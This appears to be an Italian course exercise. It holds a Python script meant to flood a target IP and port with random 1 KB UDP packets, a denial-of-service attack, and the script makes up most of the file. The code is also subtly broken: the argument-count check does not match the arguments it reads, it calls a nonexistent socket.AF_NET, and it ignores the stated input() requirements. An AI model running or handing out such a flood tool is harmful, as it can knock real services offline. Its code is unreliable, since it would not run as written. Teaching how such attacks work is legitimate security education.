"""
L'esercizio di oggi è scrivere un programma in Python che simuli un UDP flood, 
ovvero l'invio massivo di richieste UDP verso una macchina target che è in 
ascolto su una porta UDP casuale (nel nostro caso un DoS).  

Requisiti:
    -Il programma deve richiedere l'inserimento dell'IP target (input)
    -Il programma deve richiedere l'inserimento della porta target (input)
    -La grandezza dei pacchetti da inviare è di 1 KB per pacchetto 
        - Suggerimento: per costruire il pacchetto da 1KB potete utilizzare il modulo 
        «random» per la generazione di byte casuali.
    -Il programma deve chiedere all'utente quanti pacchetti da 1 KB inviare (input)
"""

import sys
import socket
import random
import time

if len(sys.argv) != 3:
    print("Usage: python w7d4.py <ip> <porta> <numero_pacchetti>")
    sys.exit(254)

ip = sys.argv[1]
porta = sys.argv[2]
npack = int(sys.argv[3])

s = socket.socket(socket.AF_NET, socket.SOCK_DGRAM)
s.connect((ip, int(porta)))

for i in range(npack):
    packet = random.randbytes(1024)
    s.send(packet)
    print(f"Inviato pacchetto {i + 1}/{npack} a {ip}:{porta}")

s.close()
print("Tutti i pacchetti sono stati inviati")





